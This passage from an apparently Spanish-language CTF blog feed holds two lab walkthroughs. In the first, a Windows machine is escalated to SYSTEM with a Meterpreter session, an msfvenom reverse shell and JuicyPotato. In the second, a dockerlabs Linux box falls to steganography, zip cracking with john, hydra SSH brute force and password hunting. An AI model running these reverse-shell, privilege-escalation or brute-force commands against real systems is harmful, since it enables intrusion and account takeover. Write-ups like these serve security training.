<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>192.168.1.12:4444 -&gt; 192.168.1.11:62032<span class="o">)</span> at 2024-06-23 15:32:58 +0200

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server stopped.

meterpreter <span class="o">&gt;</span> 

</code></pre></div></div>

<p>Vemos con que usuario estamos en el sistema con <code class="language-plaintext highlighter-rouge">getuid</code> y que privilegios tiene <code class="language-plaintext highlighter-rouge">getprivs</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> getuid
Server username: WIN-RE8NJPG9K5N<span class="se">\h</span>acker

meterpreter <span class="o">&gt;</span> getprivs

Enabled Process Privileges
<span class="o">==========================</span>

Name
<span class="nt">----</span>
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseWorkingSetPrivilege
</code></pre></div></div>

<p>Buscamos información del sistema con <code class="language-plaintext highlighter-rouge">sysinfo</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> sysinfo
Computer        : WIN-RE8NJPG9K5N
OS              : Windows Server 2012 R2 <span class="o">(</span>6.3 Build 9600<span class="o">)</span><span class="nb">.</span>
Architecture    : x64
System Language : es_ES
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Ahora nos queda obtener privilegios de administrador. Para ello, nos aprovechamos de los privilegios del usuario. En <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">hacktricks</a> vemos las diferentes posibilidades que tenemos. Yo voy a usar <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">JuicyPotato</a> para la escalada.</p>

<p>Descargamos <a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/142582717/538c8db8-9c94-11e8-84e5-46a5d9473358?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20240621%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20240621T172808Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=cc316de6c04358d3f93c007d7c6ca6e16edc972949549ffce1471cc4526e01e0&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=142582717&amp;response-content-disposition=attachment%3B%20filename%3DJuicyPotato.exe&amp;response-content-type=application%2Foctet-stream">JuicyPotato</a> :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
</code></pre></div></div>

<p>Creamos una shell reversa para windows con <code class="language-plaintext highlighter-rouge">msfvenom</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.0.2.5 <span class="nv">LPORT</span><span class="o">=</span>8889 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
</code></pre></div></div>

<p>Nos ponemos a la escucha:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889
listening on <span class="o">[</span>any] 8889 ...

</code></pre></div></div>

<p>Subimos JuicyPotato y la shell que acamos de generar a la máquina victima. Después desde meterpreter abrimos una shell con <code class="language-plaintext highlighter-rouge">shell</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> upload JuicyPotato.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading  : /home/murrusko/vms/espeto/JuicyPotato.exe -&gt; JuicyPotato.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploaded 339.50 KiB of 339.50 KiB <span class="o">(</span>100.0%<span class="o">)</span>: /home/murrusko/vms/espeto/JuicyPotato.exe -&gt; JuicyPotato.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Completed  : /home/murrusko/vms/espeto/JuicyPotato.exe -&gt; JuicyPotato.exe
meterpreter <span class="o">&gt;</span> upload shell.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading  : /home/murrusko/vms/espeto/shell.exe -&gt; shell.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploaded 72.07 KiB of 72.07 KiB <span class="o">(</span>100.0%<span class="o">)</span>: /home/murrusko/vms/espeto/shell.exe -&gt; shell.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Completed  : /home/murrusko/vms/espeto/shell.exe -&gt; shell.exe
meterpreter <span class="o">&gt;</span> shell
Process 1192 created.
Channel 4 created.
Microsoft Windows <span class="o">[</span>Versi�n 6.3.9600]
<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. Todos los derechos reservados.

C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ownloads&gt;

</code></pre></div></div>

<p>Ejecutamos JuicyPotato:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ownloads&gt;.<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> .<span class="se">\s</span>hell.exe
.<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> .<span class="se">\s</span>hell.exe
Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 443
....
<span class="o">[</span>+] authresult 0
<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM

<span class="o">[</span>+] CreateProcessWithTokenW OK

C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ownloads&gt;

</code></pre></div></div>

<p>Y obtenemos la shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889
listening on <span class="o">[</span>any] 8889 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.141] 49171
Microsoft Windows <span class="o">[</span>Versi�n 6.3.9600]
<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. Todos los derechos reservados.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami 
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="principiante" /><summary type="html"><![CDATA[Estamos ante una máquina Windows de nivel principiante creada por CuriosidadesDeHackers y condor de la plataforma The Hackers Labs.]]></summary></entry><entry><title type="html">HereBash</title><link href="/posts/hereBash/" rel="alternate" type="text/html" title="HereBash" /><published>2024-06-22T00:00:00+00:00</published><updated>2024-06-22T00:00:00+00:00</updated><id>/posts/hereBash</id><content type="html" xml:base="/posts/hereBash/"><![CDATA[<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-Pn</span> <span class="nt">-n</span> 172.17.0.2
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<p>Como vemos sólo tiene abiertos los puertos <code class="language-plaintext highlighter-rouge">22</code> y <code class="language-plaintext highlighter-rouge">80</code>. Realizamos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> para ver más detalles de esos puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-v</span> <span class="nt">-p22</span>,80 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6p1 Ubuntu 3ubuntu13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 1b:16:59:41:d2:f1:d4:cf:20:cc:ad:e0:f8:8c:ed:a2 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 72:9b:5b:79:74:e8:18:d6:0b:31:2e:99:00:01:b5:34 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET

</code></pre></div></div>

<p>Lo único relevante es que usa una versión reciente de <code class="language-plaintext highlighter-rouge">Apache</code> y que nos muestra una web por defecto.</p>

<p>Comprobamos con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">-a</span> 3 <span class="nt">-v</span> http://172.17.0.2
WhatWeb report <span class="k">for </span>http://172.17.0.2
Status    : 200 OK
Title     : Apache2 Ubuntu Default Page: It works
IP        : 172.17.0.2
Country   : RESERVED, ZZ

Summary   : Apache[2.4.58], HTTPServer[Ubuntu Linux][Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)]</span>

Detected Plugins:
<span class="o">[</span> Apache <span class="o">]</span>
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server <span class="k">for </span>modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services <span class="k">in </span><span class="nb">sync </span>with the current 
        HTTP standards. 

        Version      : 2.4.58 <span class="o">(</span>from HTTP Server Header<span class="o">)</span>
        Google Dorks: <span class="o">(</span>3<span class="o">)</span>
        Website     : http://httpd.apache.org/

<span class="o">[</span> HTTPServer <span class="o">]</span>
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Ubuntu Linux
        String       : Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span> <span class="o">(</span>from server string<span class="o">)</span>

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Fri, 21 Jun 2024 22:24:25 GMT
        Server: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
        Last-Modified: Sun, 16 Jun 2024 22:12:40 GMT
        ETag: <span class="s2">"29ed-61b09259d8600-gzip"</span>
        Accept-Ranges: bytes
        Vary: Accept-Encoding
        Content-Encoding: <span class="nb">gzip
        </span>Content-Length: 3155
        Connection: close
        Content-Type: text/html
</code></pre></div></div>

<p>Vamos a hacer una búsqueda de directorios y ficheros con <code class="language-plaintext highlighter-rouge">feroxbuster</code>. Le indicamos con <code class="language-plaintext highlighter-rouge">-u</code> la url, con <code class="language-plaintext highlighter-rouge">-w</code> el diccionario a usar para la búsqueda, <code class="language-plaintext highlighter-rouge">-x</code> para indicarle qué extensión buscar en los ficheros y <code class="language-plaintext highlighter-rouge">-r</code> para seguir los redirecciones:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://172.17.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> php,html,txt <span class="nt">-r</span>

200      GET      939l     2384w    25537c http://172.17.0.2/spongebob/spongebob.html
200      GET      838l     2290w    19747c http://172.17.0.2/spongebob/style.css
200      GET      470l     2274w   217762c http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg
200      GET      365l      968w    10733c http://172.17.0.2/index.html
200      GET       22l      105w     5952c http://172.17.0.2/icons/ubuntu-logo.png
200      GET      365l      968w    10733c http://172.17.0.2/405      GET        1l        3w       20c http://172.17.0.2/scripts/put.php
200      GET       17l       71w     1130c http://172.17.0.2/scripts/
200      GET       18l       80w     1341c http://172.17.0.2/spongebob/
200      GET       15l       49w      739c http://172.17.0.2/revolt/
</code></pre></div></div>

<p>Me llama la atención el fichero <code class="language-plaintext highlighter-rouge">/scripts/put.php</code>. Hacemos un <code class="language-plaintext highlighter-rouge">curl</code> al fichero y nos dice que el metodo no está permitido</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://172.17.0.2/scripts/put.php
Método no permitido
</code></pre></div></div>

<p>Probamos el metodo <code class="language-plaintext highlighter-rouge">PUT</code> y siempre nos devuelve la misma cadena <em>spongebob</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> PUT http://172.17.0.2/scripts/put.php <span class="nt">-v</span>
<span class="k">*</span>   Trying 172.17.0.2:80...
<span class="k">*</span> Connected to 172.17.0.2 <span class="o">(</span>172.17.0.2<span class="o">)</span> port 80
<span class="o">&gt;</span> PUT /scripts/put.php HTTP/1.1
<span class="o">&gt;</span> Host: 172.17.0.2
<span class="o">&gt;</span> User-Agent: curl/8.8.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> 
&lt; HTTP/1.1 200 OK
&lt; Date: Fri, 21 Jun 2024 22:48:04 GMT
&lt; Server: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Content-Length: 10
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
&lt; 
spongebob
<span class="k">*</span> Connection <span class="c">#0 to host 172.17.0.2 left intact</span>
</code></pre></div></div>

<p>Descartamos esa via. Ahora nos descargamos la imagen que hay en <code class="language-plaintext highlighter-rouge">/spongebob/upload/</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg
</code></pre></div></div>

<p>Buscamos si hay algún fichero oculto en esa imagen (esteganografía) con <code class="language-plaintext highlighter-rouge">stegseek</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>stegseek ohnorecallwin.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

<span class="o">[</span>i] Found passphrase: <span class="s2">"spongebob"</span>
<span class="o">[</span>i] Original filename: <span class="s2">"seguro.zip"</span><span class="nb">.</span>
<span class="o">[</span>i] Extracting to <span class="s2">"ohnorecallwin.jpg.out"</span><span class="nb">.</span>
</code></pre></div></div>

<p>Comprobamos si es un fichero zip:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file ohnorecallwin.jpg.out 
ohnorecallwin.jpg.out: Zip archive data, at least v1.0 to extract, compression <span class="nv">method</span><span class="o">=</span>store
</code></pre></div></div>

<p>Y lo remombramos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv </span>ohnorecallwin.jpg.out seguro.zip
</code></pre></div></div>

<p>Intentamos descomprimirlo y nos pide una clave. Vamos a intentar averiguarla con <code class="language-plaintext highlighter-rouge">john</code>. Primero guardamos el hash del fichero zip con <code class="language-plaintext highlighter-rouge">zip2john</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>zip2john seguro.zip <span class="o">&gt;</span> zipHash
ver 1.0 efh 5455 efh 7875 seguro.zip/secreto.txt PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>23, <span class="nv">decmplen</span><span class="o">=</span>11, <span class="nv">crc</span><span class="o">=</span>3DF4DA21 <span class="nv">ts</span><span class="o">=</span>8387 <span class="nv">cs</span><span class="o">=</span>8387 <span class="nb">type</span><span class="o">=</span>0
</code></pre></div></div>

<p>Después intentamos crackear la password usando el diccionario <code class="language-plaintext highlighter-rouge">rockyou.txt</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt zipHash 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
chocolate        <span class="o">(</span>seguro.zip/secreto.txt<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2024-06-22 12:31<span class="o">)</span> 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<p>Descomprimimos con la clavé obtenida:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>7z x secreto.zip 

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:2 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 211 bytes <span class="o">(</span>1 KiB<span class="o">)</span>

Extracting archive: secreto.zip
<span class="nt">--</span>
Path <span class="o">=</span> secreto.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 211

    
Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
Everything is Ok

Size:       11
Compressed: 211

</code></pre></div></div>

<p>Y al abrir el fichero vemos una palabra</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>secreto.txt 
aprendemos
</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>La palabra puede ser un usuario o una contraseña. Primero hacemos un intento de averiguar una contraseña para el usuario <em>aprendemos</em>. Para ello usamos <code class="language-plaintext highlighter-rouge">hydra</code> con <code class="language-plaintext highlighter-rouge">-l</code> indicamos el usuario, <code class="language-plaintext highlighter-rouge">-P</code> indicamos el diccionario de passwords <code class="language-plaintext highlighter-rouge">-V</code> para ver el detalle, <code class="language-plaintext highlighter-rouge">-I</code> para que no tenga en cuenta sesiones anteriores y <code class="language-plaintext highlighter-rouge">-f</code> para parar con la primera coincidencia. Tambien le indicamos el protocolo al que queremos realizar la fuerza bruta <code class="language-plaintext highlighter-rouge">ssh://172.17.0.2</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hydra <span class="nt">-l</span> aprendemos <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 <span class="nt">-V</span> <span class="nt">-I</span> <span class="nt">-f</span>

</code></pre></div></div>

<p>No obtenemos ningún resultado. Ahora vamos a probar a buscar un nombre de usuario para contraseña <em>aprendemos.</em> Con <code class="language-plaintext highlighter-rouge">-L</code> indicamos el diccionario de nombres de usuario y con <code class="language-plaintext highlighter-rouge">-p</code> la password. El resto es igual que el paso anterior.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt <span class="nt">-p</span> aprendemos <span class="nt">-t</span> 16 <span class="nt">-V</span> <span class="nt">-f</span> <span class="nt">-I</span> ssh://172.17.0.2
6248 of 624377 <span class="o">[</span>child 9] <span class="o">(</span>0/7<span class="o">)</span>
<span class="o">[</span>22][ssh] host: 172.17.0.2   login: rosa   password: aprendemos
<span class="o">[</span>STATUS] attack finished <span class="k">for </span>172.17.0.2 <span class="o">(</span>valid pair found<span class="o">)</span>
</code></pre></div></div>

<p>Obtenemos las credenciales <code class="language-plaintext highlighter-rouge">rosa:aprendemos</code> para poder acceder por ssh a nuestra victima. Nos conectamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh rosa@172.17.0.2
rosa@4c6b113dd021:~<span class="nv">$ </span><span class="nb">hostname
</span>4c6b113dd021
</code></pre></div></div>

<p>Buscamos que usuarios hay en el sistema.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:/home<span class="nv">$ </span><span class="nb">grep</span> <span class="s2">"bash"</span> /etc/passwd
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
rosa:x:1001:1001:,,,:/home/rosa:/bin/bash
pedro:x:1002:1002:,,,:/home/pedro:/bin/bash
juan:x:1003:1003:,,,:/home/juan:/bin/bash
</code></pre></div></div>

<p>Lo primero que voy a hacer es buscar ficheros de cada usuario en el sistema. Usamos <code class="language-plaintext highlighter-rouge">find</code> para buscar en el directorio <code class="language-plaintext highlighter-rouge">/</code> de forma recursiva los ficheros <code class="language-plaintext highlighter-rouge">-type f</code> del usuario pedro <code class="language-plaintext highlighter-rouge">-user pedro</code> y redireccionamos a <code class="language-plaintext highlighter-rouge">/dev/null</code> los errores <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:/home<span class="nv">$ </span>find / <span class="nt">-user</span> pedro <span class="nt">-type</span> f 2&gt;/dev/null 
/var/mail/.pass_juan
</code></pre></div></div>

<p>Encontramos un fichero, pero…</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/mail/.pass_juan 
<span class="nt">-rw-rw----</span> 1 pedro pedro 17 Jun 18 03:41 /var/mail/.pass_juan
</code></pre></div></div>

<p>No tenemos permisos de lectura con el user actual.</p>

<p>En el home del user actual, rosa, vemos que hay una carpeta llamada <code class="language-plaintext highlighter-rouge">-</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
drwxrwxr-x 69 rosa rosa 4096 Jun 17 08:25 -
</code></pre></div></div>

<p>Para entrar al directorio <code class="language-plaintext highlighter-rouge">-</code> hacemos <code class="language-plaintext highlighter-rouge">cd ./-</code> . Una vez dentro vemos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:~/-<span class="nv">$ </span><span class="nb">ls 
</span>buscaelpass1   buscaelpass25  buscaelpass40  buscaelpass56
buscaelpass10  buscaelpass26  buscaelpass41  buscaelpass57
buscaelpass11  buscaelpass27  buscaelpass42  buscaelpass58
buscaelpass12  buscaelpass28  buscaelpass43  buscaelpass59
buscaelpass13  buscaelpass29  buscaelpass44  buscaelpass6
buscaelpass14  buscaelpass3   buscaelpass45  buscaelpass60
buscaelpass15  buscaelpass30  buscaelpass46  buscaelpass61
buscaelpass16  buscaelpass31  buscaelpass47  buscaelpass62
buscaelpass17  buscaelpass32  buscaelpass48  buscaelpass63
buscaelpass18  buscaelpass33  buscaelpass49  buscaelpass64
buscaelpass19  buscaelpass34  buscaelpass5   buscaelpass65
buscaelpass2   buscaelpass35  buscaelpass50  buscaelpass66
buscaelpass20  buscaelpass36  buscaelpass51  buscaelpass67
buscaelpass21  buscaelpass37  buscaelpass52  buscaelpass7
buscaelpass22  buscaelpass38  buscaelpass53  buscaelpass8
buscaelpass23  buscaelpass39  buscaelpass54  buscaelpass9
buscaelpass24  buscaelpass4   buscaelpass55  creararch.sh
</code></pre></div></div>

<p>Bastantes carpetas y un fichero en bash. Lo abrimos y vemos que hace:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:~/-<span class="nv">$ </span><span class="nb">cat </span>creararch.sh 
<span class="c">#!/bin/bash</span>

<span class="c"># Buscamos directorios que empiezan con "busca"</span>
<span class="k">for </span>directorio <span class="k">in </span>busca<span class="k">*</span><span class="p">;</span> <span class="k">do</span>
        <span class="c"># Comprobamos si el directorio existe</span>
        <span class="k">if</span> <span class="o">[</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$directorio</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
                <span class="c"># Crearmos 50 archivos y les metemos el contenido xx</span>
                <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..50<span class="o">}</span><span class="p">;</span> <span class="k">do
                        </span><span class="nb">touch</span> <span class="s2">"</span><span class="nv">$directorio</span><span class="s2">/archivo</span><span class="nv">$i</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"xxxxxx:xxxxxx"</span> <span class="o">&gt;</span><span class="nv">$directorio</span>/archivo<span class="nv">$i</span>
                <span class="k">done
                </span><span class="nb">echo</span> <span class="s2">"Se crearon 50 archivos en </span><span class="nv">$directorio</span><span class="s2">"</span>
        <span class="k">else
                </span><span class="nb">echo</span> <span class="s2">"El directorio </span><span class="nv">$directorio</span><span class="s2"> no existe"</span>
        <span class="k">fi
done</span>
</code></pre></div></div>

<p>Recorre todos los directorios que comienzan con <em>busca</em> y crea 50 archivos con un texto dentro <code class="language-plaintext highlighter-rouge">touch "$directorio/archivo$i" &amp;&amp; echo "xxxxxx:xxxxxx" &gt;$directorio/archivo$i</code> . Entonces buscaremos el fichero que no contenga esa cadena. Usamos <code class="language-plaintext highlighter-rouge">grep</code> con las opciones<code class="language-plaintext highlighter-rouge">-rv</code> que sirve para buscar recursivamente por los subdirectorios <code class="language-plaintext highlighter-rouge">r</code> y excluyendo <code class="language-plaintext highlighter-rouge">v</code> la cadena <code class="language-plaintext highlighter-rouge">xxxxxx:xxxxxx</code> empezando en el directorio actual.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:~/-<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-rv</span> <span class="s2">"xxxxxx:xxxxxx"</span> <span class="nb">.</span>
./buscaelpass33/archivo21:pedro:ell0c0
./creararch.sh:#!/bin/bash
./creararch.sh:
./creararch.sh:# Buscamos directorios que empiezan con <span class="s2">"busca"</span>
./creararch.sh:for directorio <span class="k">in </span>busca<span class="k">*</span><span class="p">;</span> <span class="k">do</span>
./creararch.sh: <span class="c"># Comprobamos si el directorio existe</span>
./creararch.sh: <span class="k">if</span> <span class="o">[</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$directorio</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
./creararch.sh:         <span class="c"># Crearmos 50 archivos y les metemos el contenido xx</span>
./creararch.sh:         <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..50<span class="o">}</span><span class="p">;</span> <span class="k">do</span>
./creararch.sh:         <span class="k">done</span>
./creararch.sh:         <span class="nb">echo</span> <span class="s2">"Se crearon 50 archivos en </span><span class="nv">$directorio</span><span class="s2">"</span>
./creararch.sh: <span class="k">else</span>
./creararch.sh:         <span class="nb">echo</span> <span class="s2">"El directorio </span><span class="nv">$directorio</span><span class="s2"> no existe"</span>
./creararch.sh: <span class="k">fi</span>
./creararch.sh:done
</code></pre></div></div>

<p>Encontramos la password de pedro. Nos logueamos como pedro:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:~/-<span class="nv">$ </span>su pedro
Password: 
pedro@4c6b113dd021:/home/rosa/-<span class="err">$</span>
</code></pre></div></div>

<p>Y como antes habíamos encontrado un fichero que pertenecía a pedro lo abrimos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pedro@4c6b113dd021:~<span class="nv">$ </span><span class="nb">cat</span> /var/mail/.pass_juan 
ZWxwcmVzaW9uZXMK
</code></pre></div></div>

<p>Nos logueamos como juan:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pedro@4c6b113dd021:~<span class="nv">$ </span>su juan
Password: 
juan@4c6b113dd021:/home/pedro<span class="nv">$ </span><span class="nb">cd</span> ~
juan@4c6b113dd021:~<span class="err">$</span>
</code></pre></div></div>

<p>Hacemos un listado a su home:</p>

